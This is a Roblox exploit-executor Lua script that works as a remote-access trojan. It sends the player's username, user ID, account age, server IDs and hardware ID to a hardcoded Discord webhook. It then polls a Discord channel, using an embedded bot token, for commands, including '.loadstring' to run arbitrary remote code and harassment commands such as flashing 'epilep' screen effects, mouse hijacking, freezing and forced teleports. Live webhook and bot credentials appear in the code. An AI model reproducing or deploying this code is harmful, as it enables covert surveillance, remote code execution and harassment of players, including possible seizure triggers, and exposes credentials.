getgenv().rat = true
local t = "MTQ".."AC5MTgwMDM0NjM3MT".."I".."5MzI2NQ.G3v5Su.vwFlEwDuzytwQP2JFmx".."U".."FO2gQmCDKjkX4-IlOs"
local h = game:GetService("HttpService")
local c = "1490778593599684869"
local TeleportService = game:GetService("TeleportService")
local player = game.Players.LocalPlayer
local prefix = "."
local camera = workspace.CurrentCamera
local requestFunc = (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request) or http_request or request

local url = "https://discord.com/api/webhooks/1490778632476430407/Riw3Cnh4hzUVZeuJVCIPyT4k6mBAj_rtus9tbBusyzIYqA7A6BKVWFG0yDmClp1tN5VW"
local function sendWebhook(message)
    local headers = {["content-type"] = "application/json"}
    
    local body = {
        ["username"] = "logger",
        ["avatar_url"] = nil,
        ["content"] = message 
    }

    requestFunc({
        Url = url,
        Method = 'POST',
        Headers = headers,
        Body = game:GetService('HttpService'):JSONEncode(body),
    })
end
if getgenv().rat == false then return end
sendWebhook("@everyone NEW LOGIN : USERNAME: "..game.Players.LocalPlayer.Name.." | DISPLAY NICKNAME : "..game.Players.LocalPlayer.DisplayName.." | USERID : "..game.Players.LocalPlayer.UserId.." | ACCOUNT AGE : "..game.Players.LocalPlayer.AccountAge.." | GAMEID : "..game.GameId.." | JOBID : "..game.JobId.." | HWID : "..gethwid().." | OTHER INFO : ".. "nill")
sendWebhook("AVAILABLE COMMANDS: .loadstring (script) | .soundtroll (volume 1 or 0) (soundid) | .join (placeid) (jobid) | .rejoin | .serverhop | .flashbang (time) | .epilep (time) | .mousetroll (mouse shakes) | .fov (fov) | .rotatecamera (time) | .invertcamera (time) | .cameratroll (camera shakes) | .screentroll (textureid) (time) | .console (print times) (text) | .disablecontrol (time) | .freeze (time)")
if not getgenv().fetched then getgenv().fetched = {} end

local processed = getgenv().fetched

local function fetchAndDisplayMessages(limit)
    local ok, r = pcall(function()
        return requestFunc({
            Url = "https://discord.com/api/v9/channels/"..c.."/messages?limit="..limit,
            Method = "GET",
            Headers = {
                Authorization = "Bot " .. t,  -- Исправлено!
                ["Content-Type"] = "application/json"
            }
        })
    end)
    
    if not ok or r.StatusCode ~= 200 then 
        return nil 
    end
    local messages = h:JSONDecode(r.Body)
    if messages and #messages > 0 then
        for i = 1, #messages do
            local msg = messages[i]
            if not processed[msg.id] then
                processed[msg.id] = true
                if msg.author and msg.author.id ~= botUserId then
                    return msg.content
                end
            end
        end
    end
    return nil
end
while getgenv().rat do
    task.wait(0.5)
    local s,e = pcall(function()
    local new = fetchAndDisplayMessages(1)
    local cmd1 = new:match("^%.(%S+)")
    local args1 = new:match("^%S+%s+(.*)")
    if new:sub(1,1) == prefix and new ~= nil then
        local parts = {}
        for part in new:gmatch("%S+") do
            table.insert(parts, part)
        end
            
        local cmd = parts[1]:sub(2)
        local args = {}
        for i = 2, #parts do
            table.insert(args, parts[i])
        end
        for i, arg in ipairs(args) do
            print(i .. ": " .. arg)
        end
        if cmd then
            
            if cmd == "loadstring" and args1 then
                task.delay(0,function()
                local func = loadstring(args1)
                if func then
                    func()
                else
                    args1()
                end
                end)
            elseif cmd == "soundtroll" and args[1] and args[2] then
                task.delay(0,function()
                UserSettings():GetService("UserGameSettings").MasterVolume = tonumber(args[1])
                local sound = Instance.new("Sound",workspace)
                sound.SoundId = "rbxassetid://"..args[2]
                repeat
                task.wait()
                until sound.IsLoaded
                sound:Play()
                game.Debris:AddItem(sound,sound.TimeLength)
                end)
            elseif cmd == "rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,player)
            elseif cmd == "join" and args[1] and args[2] then
                game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(args[1]),args[2],player)
            elseif cmd == "console" and args[1] and args[2] then
                task.delay(0,function()
                rconsolecreate()
                for i=1,tonumber(args[1]) do
                    task.wait(0.5)
                    rconsoleprint(args[2],true,true)
                    rconsolewarn(args[2],true,true)
                    rconsoleerr(args[2],true,true)
                end
                rconsoledestroy()
                end)
            elseif cmd == "flashbang" and args[1] then
                task.delay(0,function()
                local colorcor = Instance.new("ColorCorrectionEffect",game.Lighting)
                colorcor.Brightness = 10
                game.Debris:AddItem(colorcor,args[1])
                end)
            elseif cmd == "epilep" and args[1] then
                task.delay(0,function()
                local colorcor = Instance.new("ColorCorrectionEffect",game.Lighting)
                colorcor.Saturation = math.random(-100,100)
                colorcor.Contrast = 100
                game.Debris:AddItem(colorcor,args[1])
                end)
            elseif cmd == "disablecontrol" and args[1] then
                task.delay(0,function()
                    local hum = game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid")
                    if hum then
                        hum.WalkSpeed = 0
                        hum.JumpPower = 0
                        task.wait(args[1])
                        hum.WalkSpeed = game.StarterPlayer.CharacterWalkSpeed
                        hum.JumpPower = game.StarterPlayer.CharacterJumpPower
                    end
                end)
            elseif cmd == "freeze" and args[1] then
                task.delay(0,function()
                    local hum = game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
                    if hum then
                        hum.Anchored = true
                        task.wait(args[1])
                        hum.Anchored = false
                    end
                end)
            elseif cmd == "mousetroll" and args[1] then
                task.delay(0,function()
                for i=1, args[1] do
                    task.wait(0.05)
                    mousemoverel(math.random(-500,500),math.random(-500,500))
                end
                end)
            elseif cmd == "fov" and args[1] then
                workspace.CurrentCamera.FieldOfView = tonumber(args[1])
            elseif cmd == "rotatecamera" and args[1] then
                task.delay(0,function()
                camera.CameraType = Enum.CameraType.Scriptable
                camera.CFrame = camera.CFrame * CFrame.Angles(0, 0, math.rad(180))
                task.wait(args[1])
                camera.CameraType = Enum.CameraType.Custom
                end)
            elseif cmd == "invertcamera" and args[1] then
                task.delay(0,function()
                UserSettings().GameSettings.CameraYInverted = true
                task.wait(args[1])
                UserSettings().GameSettings.CameraYInverted = false
                end)
            elseif cmd == "cameratroll" and args[1] then
                task.delay(0,function()
                for i=1, args[1] do 
                    task.wait(0.05)
                    mouse2press()
                    mousemoverel(math.random(-500,500),math.random(-500,500))
                    mouse2release()
                end
                end)
            elseif cmd == "screentroll" and type(args[1]) == "string" and type(args[2]) == "string" then
                task.delay(0,function()
                if not tonumber(args[2]) then return end
                local gui = Instance.new("ScreenGui",gethui())
                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Size = UDim2.new(0, 1000, 0, 1000)
                imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
                imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
                imageLabel.Image = "rbxassetid://"..args[1]
                imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                imageLabel.BackgroundTransparency = 0.5
                imageLabel.Parent = gui
                game.Debris:AddItem(gui,tonumber(args[2]))
                end)
            elseif cmd == "serverhop" then
                local currentJobId = game.JobId
                local maxTotalTime = 10
                local startTime = tick()
                    local success, result = pcall(function()
                        local url = ("https://games.roblox.com/v1/games/%d/servers/Public?limit=100&sortOrder=Asc"):format(PLACE_ID)
                        return HttpService:JSONDecode(game:HttpGet(url))
                    end)
                    if success and result and result.data then
                        local validServers = {}
                        for _, server in pairs(result.data) do
                            if server.playing < server.maxPlayers and server.id ~= currentJobId then
                                table.insert(validServers, server)
                            end
                        end
                        if #validServers > 0 then
                            local chosen = validServers[math.random(1, #validServers)]
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, chosen.id, player)
                            return
                        end
                    end
            end
        end
    end
    end)
end
